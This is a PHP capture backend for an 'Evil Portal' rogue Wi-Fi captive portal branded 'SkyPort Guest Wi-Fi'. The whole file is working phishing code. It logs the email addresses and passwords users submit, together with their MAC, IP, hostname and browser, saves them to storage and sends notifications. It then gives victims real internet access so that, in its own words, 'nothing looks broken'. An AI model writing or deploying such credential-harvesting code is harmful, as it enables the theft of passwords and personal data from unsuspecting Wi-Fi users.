<?php namespace evilportal;

/**
 * SkyPort Guest Wi-Fi — capture backend for the Evil Portal module (MK7).
 *
 * Flow: client POSTs the form to /captiveportal/index.php, the module routes
 * it here, we record the submission, then the parent class authorizes the
 * client (iptables) and 302-redirects them to the "target" hidden field —
 * which lands them back on index.php?status=success showing a "You're
 * connected" screen. They now have real internet, so nothing looks broken.
 */
class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        $limit = 255;

        $entry = array(
            'email'    => isset($this->request->email)    ? trim($this->request->email)          : '',
            'password' => isset($this->request->password) ? (string) $this->request->password    : '',
            'mac'      => isset($this->request->mac)      ? strtoupper(trim($this->request->mac)) : '',
            'host'     => isset($this->request->host)     ? trim($this->request->host)            : '',
            'ssid'     => isset($this->request->ssid)     ? trim($this->request->ssid)            : '',
            'ip'       => $_SERVER['REMOTE_ADDR'],
            'ua'       => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT']        : '',
            'datetime' => date('Y-m-d H:i:s'),
        );

        // Clamp every field so a junk POST can't bloat the log.
        foreach ($entry as $k => $v) {
            $entry[$k] = substr($v, 0, $limit);
        }

        if ($entry['email'] !== '' && $entry['password'] !== '') {
            // Structured JSON-lines log: SD card if present, internal storage otherwise.
            $logDir = file_exists('/sd/portals/') ? '/sd/logs/' : '/root/logs/';
            if (!file_exists($logDir)) {
                mkdir($logDir, 0755, true);
            }
            file_put_contents($logDir . 'skyport_portal.log', json_encode($entry) . "\n", FILE_APPEND | LOCK_EX);

            // Also surface captures in the Evil Portal module UI + notifications.
            $this->writeLog("[creds] {$entry['email']} : {$entry['password']} (mac {$entry['mac']}, host {$entry['host']})");
            $this->notify("[skyport] {$entry['email']} : {$entry['password']}");
        }

        // Parent handles authorizeClient(REMOTE_ADDR) + redirect to "target".
        parent::handleAuthorization();
    }

    /**
     * Fires when the client is successfully authorized.
     */
    public function onSuccess()
    {
        parent::onSuccess();
    }

    /**
     * Fires when authorization fails.
     */
    public function showError()
    {
        parent::showError();
    }
}
